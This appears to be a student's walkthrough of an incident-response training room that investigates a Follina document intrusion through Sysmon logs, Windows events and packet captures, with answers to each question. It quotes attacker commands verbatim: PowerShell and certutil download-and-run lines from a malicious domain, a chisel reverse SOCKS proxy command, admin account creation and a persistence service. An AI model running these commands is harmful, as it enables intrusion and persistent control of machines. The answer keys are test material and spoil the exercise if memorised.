#### Prerequisites

[[Sysmon]]
[[Windows Event Logs]]
[[Wireshark: Packet Operations]]
[[Brim]]

## Preparation - Log Analysis

- Log Analysis
- Event Correlation
  These both aspects are important to analyze captured events.

#### Log Analysis

Log analysis is the process of understanding events generated by a computer to identify anomalies such as security threats, application bugs, system performance, or other risks that may impact the organization.

A log file is an audit trail of events or activities within the applications and systems of an organization.

#### Event Correlation

Event correlation identifies significant relationships from multiple log sources.

It deals with identifying significant artefacts co-existing from different log sources. Example: network connection log may exist in various log sources, such as Sysmon (Event ID: 3) and Firewall logs. Firewall logs may provide the source and destination IP, protocol and the action taken.
With this information, we can connect the dots of each artefact from the two data sources:

- Source and Destination IP
- Source and Destination Port
- Action Taken
- Protocol
- Process name
- User Account
- Machine Name

## Preparation - Tools and Artifacts

#### Compare by hash

Before conducting the investigation, one of the most important steps is to compare artefacts by their hashes. it is a common practice to verify the artefacts are expected as it is.

You can get the hashes by `Get-FileHash`

#### Toolset

Toolset is Sysmon Logs, Windows Event Logs, Packet Capture

#### Endpoint Logs

- EvtxEcmd
- Timeline Explorer
- SysmonView
- Event Viewer
  EvtxeCmd and Timeline Explorer are part of EZTools.

#### Netwrok logs

- Wireshark
- Brim

#### SysmonView

Is a GUI-based tool that visualises Sysmon Logs. Before using this tool, we must export the log file's contents into XML via **Event Viewer**.
Usage:

- Go to `File > Import Sysmon Event Logs` then choose the XML files generated using the Event Viewer.
- Once loaded, the left sidebar has search functionality that can filter a specific process in mind.
- Choose the image path and session GUID to render the mapped view.

#### Questions:

1. What is the SHA256 hash of the capture.pcapng file?
   **Answer:** CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6
2. What is the SHA256 hash of the sysmon.evtx file?
   **Answer:** 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F
3. What is the SHA256 hash of the windows.evtx file?
   **Answer:** D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60

## Initial Access - Malicious Document

In this incident, you will act as an Incident Responder from an alert triaged by one of your Security Operations Center analysts. The analyst has confirmed that the alert has a **CRITICAL** severity that needs further investigation.

As reported by the SOC analyst, the intrusion started from a malicious document. In addition, the analyst compiled the essential information generated by the alert as listed below:

- The malicious document has a **.doc** extension.
- The user downloaded the malicious document via **chrome.exe**.
- The malicious document then executed a chain of commands to attain code execution.

To aid with the investigation, you may refer to the cheatsheet crafted by the team applicable to this scenario:

- Start with the events generated by Sysmon.
- EvtxEcmd, Timeline Explorer, and SysmonView can interpret Sysmon logs.
- Follow the child processes of WinWord.exe.
- Use filters such as ParentProcessID or ProcessID to correlate the relationship of each process.
- We can focus on Sysmon events such as Process Creation (Event ID 1) and DNS Queries (Event ID 22) to correlate the activity generated by the malicious document.

#### Questions:

1. The user of this machine was compromised by a malicious document. What is the file name of the document?
   To answer this questions we need to analyze sysmon logs. First of all, most of .pdf are opened with chrome, Edge or other PDF Reader, let's look if we have some of them. We see chrome.exe, let's check processes generated. Bingo, we have Target file that was opened
   **Answer:** free_magicules.doc
2. What is the name of the compromised user and machine?
   We need to look by which user the action was issued. We see from the path that username is benimaru. Above is the name of machine where we got logs from - Tempest
   **Answer:** benimaru-TEMPEST
3. What is the PID of the Microsoft Word process that opened the malicious document?
   To answer this questions we need to move to Word Process, also from process list - WINWORD.exe. Then use first event that connected to malicious file to see PID
   **Answer:** 496
4. Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?
   Let's go to the Event Viewer to find the answer. We know that the PID - 496 and Event ID for DNS Query is 22. use it as filter and search for PID. Our answer is in phishteam.xyz
   **Answer:** 167.71.199.191
5. What is the base64 encoded string in the malicious payload executed by the document?
   We know that Parent PID is 496, and Event ID is Process Creation (also 1). We need to sort by these parameters and look any command lines that are interesting for further consideration.
   **Answer:** _JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==_
6. What is the CVE number of the exploit used by the attacker to achieve a remote code execution?
   From decoded output we can search it and find name of it - Follina.
   **Answer:** 2022-30190

## Initial Access - Stage 2 execution

Malicious Document - Stage 2
Based on the initial findings, we discovered that there is a stage 2 execution:

- The document has successfully executed an encoded base64 command.
- Decoding this string reveals the exact command chain executed by the malicious document.

#### Investigation Guide

With the following discoveries, we may refer again to the cheatsheet to continue with the investigation:

- The Autostart execution reflects explorer.exe as its parent process ID.
- Child processes of explorer.exe within the event timeframe could be significant.
- Process Creation (Event ID 1) and File Creation (Event ID 11) succeeding the document execution are worth checking.
  Significant Data Sources:
- Sysmon

#### Questions:

1. The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?
   We can find it by decoding base64 encoded command.
   `$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;`
   Also it uses $app=[Environment] also AppData from user that executed the file. Then our path is
   **Answer:** C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
2. The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?
   _Format: Remove the double quotes from the log._
   When the process are being executed it creates a process. It means that we need to sort for Process Creation Event. Also we need to sort for TEMPEST\Benimaru User. Also when process do execute - it happens through cmd.exe or powershell.exe. In our incident it was happened through powershell.exe. SysmonView can prove it
   **Answer:** C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
3. Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?
   We can read SHA256 Hash from last question
   **Answer:** CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
4. The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?
   _Format: domain:port_
   Look at the previous DNS query + Network Connection. It happened with port 80 and domain is resolvecyber.xyz
   **Answer:** resolvecyber.xyz:80

## Initial Access - Malicious Document Traffic

Based on the collected findings, we discovered that the attacker fetched the stage 2 payload remotely:

- We discovered the Domain and IP invoked by the malicious document on Sysmon logs.
- There is another domain and IP used by the stage 2 payload logged from the same data source.

#### Investigation Guide

Since we have discovered network-related artefacts, we may again refer to our cheatsheet, which focuses on Network Log Analysis:

- We can now use **Brim and Wireshark** to investigate the packet capture.
- Find network events related to the harvested domains and IP addresses.
- Sample Brim filter that you can use for this investigation: `_path=="http" "<malicious domain>"`

#### Data Sources:

- Packet Capture

#### Questions

1. What is the URL of the malicious payload embedded in the document?
   Let's use Wireshark for that. First of all we need to sort for http packets and for 'phishteam.xyz'
   `http.host == "phishteam.xyz" && http.request.method == "GET"`
   **Answer:** http://phishteam.xyz/02dcf07/index.html
2. What is the encoding used by the attacker on the c2 connection?
   We got the information about c2 server from the last part of tasks. it was resolvecyber.xyz, now we need to sort by this host
   `http.host == "resolvecyber.xyz" && http.request.method == "GET"`
   As query in q parameter we see encoded information that we need decode. According to it style it seems to be base64
   **Answer:** base64
3. The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?
   We can answer this question by using the second one. The query is transported through q parameter
   **Answer:** q
4. The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?
   Also can be answered with the same http URI
   **Answer:** /9ab62b5
5. What is the HTTP method used by the binary?
   **Answer:** GET
6. Based on the user agent, what programming language was used by the attacker to compile the binary?
   _Format: Answer in lowercase_
   Let's analyze the user-agent in HTTP Header. User-agent: Nim http client
   **Answer:** nim

## Discovery - Internal Reconaissance

Based on the collected findings, we have discovered that the malicious binary continuously uses the C2 traffic:

- We can easily decode the encoded string in the network traffic.
- The traffic contains the command and output executed by the attacker.

#### Investigation Guide

To continue with the investigation, we may focus on the following information:

- Find network and process events connecting to the malicious domain.
- Find network events that contain an encoded command.
- We can use Brim to filter all packets containing the encoded string.
- Look for endpoint enumeration commands since the attacker is already inside the machine.
  In addition, we may refer to our cheatsheet for Brim to quickly investigate the encoded traffic with the following filters:
- To get all HTTP requests related to the malicious C2 traffic: `_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts`
  Significant Data Sources:
- Packet Capture
- Sysmon

#### Questions

1. The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?
   We can examine the found queries if there is something interesting transported.
   **Answer:** infernotempest
2. The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?
   For that purpose we continue to search through encoded commands
   `C:\Windows\system32\NETSTAT.EXE -ano -p tcp`
   That was command used for that. The output gave a lot of ports but 5985 has a huge interest for us as it used for WinRM remote control
   **Answer:** 5985
3. The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?
   In sysmon after ports were enumerated adversaries had downloaded ch.exe. We need to look afterwards in which command line ch.exe is used and that's will be our answer
   **Answer:** C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
4. What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?
   Use the same window again to access Hashes
   **Answer:** _8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451_
5. What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.
   To answer this question we need to look up for this malware using VirusTotal.
   **Answer:** chisel.exe
6. The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?
   Right after establishing SOCKS client we have an another event with spawning `wsmprovhost.exe`. It indicates creation of WinRM instance.
   **Answer:** WinRM

## Privilege Escalation - Exploiting Privileges

Based on the collected findings, the attacker gained a stable shell through a reverse socks proxy.

#### Investigation Guide

With this, we can focus on the following network and endpoint events:

- Look for events executed after the successful execution of the reverse socks proxy tool.
- Look for potential privilege escalation attempts, as the attacker has already established a persistent low-privilege access.

#### Significant Data Sources:

- Packet Capture
- Sysmon

#### Questions

1. After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?
   Let's scroll through events happened after creation of WinRM instance. We could see a request to phishteam.xyz that looks for spf.exe file. Now we need to look for hash of it. Therefore we can use Sysmon View to achieve that
   **Answer:** spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D
2. Based on the SHA256 hash of the binary, what is the name of the tool used?
   Search the hash with VirusTotal
   **Answer:** PrintSpoofer
3. The tool exploits a specific privilege owned by the user. What is the name of the privilege?
   We can google this instrument to look what it uses. Also SeImpersonatePrivilege can be also indicated by Windows Sysmon Event where Impersonation level is Impersonation
   **Answer:** SeImpersonatePrivilege
4. Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?
   **Answer:** final.exe
5. The binary connects to a different port from the first c2 connection. What is the port used?
   Search for final.exe in Sysmon View and we see that this program establishes a connection with 8080 port.
   **Answer:** 8080

## Actions on Objective - Fully-owned Machine

Now, the attacker has gained administrative privileges inside the machine. Find all persistence techniques used by the attacker.
In addition, the unusual executions are related to the malicious C2 binary used during privilege escalation.

#### Investigation Guide

Now, we can rely on our cheatsheet to investigate events after a successful privilege escalation:

- Useful Brim filter to get all HTTP requests related to the malicious C2 traffic : `_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts`
- The attacker gained SYSTEM privileges; now, the user context for each malicious execution blends with **NT Authority\System.**
- All child events of the new malicious binary used for C2 are worth checking.

#### Significant Data Sources:

- Packet Capture
- Sysmon
- Windows Event Logs

#### Questions

1. Upon achieving SYSTEM access, the attacker then created two users. What are the account names?
   For that question we'll use Windows sysmon events. Here we sort for 4720, also user creation
   **Answer:** shuna,shion
2. Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?
   Let's use timestamp of first account creation to investigate it with sysmon event package.
   `net user shuna princess`, also /add is required
   **Answer:** /add
3. Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?
   Answered above before
   **Answer:** 4720
4. The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?
   Let's look in Sysmon View for further commands associated with both accounts. We can see this command that is our answer.
   **Answer:** net localgroup administrators /add shion
5. Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?
   There's two ways - google it or locate the timestamp when command was issues and look for EventID
   **Answer:** 4732
6. After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?
   Let's look for any commands after giving administrator privileges. I see nothing. But before I saw sc.exe used for a command to establish a service. Most likely it is the answer
   **Answer:** C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto

## Conclusion

Congratulation on completing the room. That's the one of the latest challenges you need to complete to close SOC L1 Path.
